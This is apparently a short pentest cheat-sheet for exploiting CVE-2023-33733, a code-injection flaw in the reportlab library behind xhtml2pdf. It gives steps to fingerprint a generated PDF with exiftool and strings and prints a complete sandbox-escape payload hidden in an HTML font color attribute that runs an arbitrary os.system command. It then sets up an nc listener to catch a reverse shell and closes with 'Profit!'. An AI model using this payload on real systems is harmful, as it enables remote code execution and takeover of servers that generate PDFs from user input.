# xhtml2pdf reportlab Python Library Code Injection CVE-2023-33733

## Link: https://github.com/c53elyas/CVE-2023-33733

### Steps to exploit:

#### 1) Check for any functions that converts to pdf. Download the pdf and inspect it with exiftool and/or strings

 - exiftool FILE.pdf

 - strings FILE.pdf

#### 2) Upon inspection, if we find that the producer is xhtml2pdf and/or with strings we find that the pdf is being generated with reportlab library, we craft an exploit to gain code execution.

<para<<font color="[[[getattr(pow, Word('__globals__'))['os'].system('INJECT_COMMAND_HERE') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"<
                exploit
</font></para<

#### 3) Setup listener to catch the shell

 - nc -lvnp 4444

#### 4) Inject the exploit written above to the appropriate field for it to trigger

#### 5) Profit!
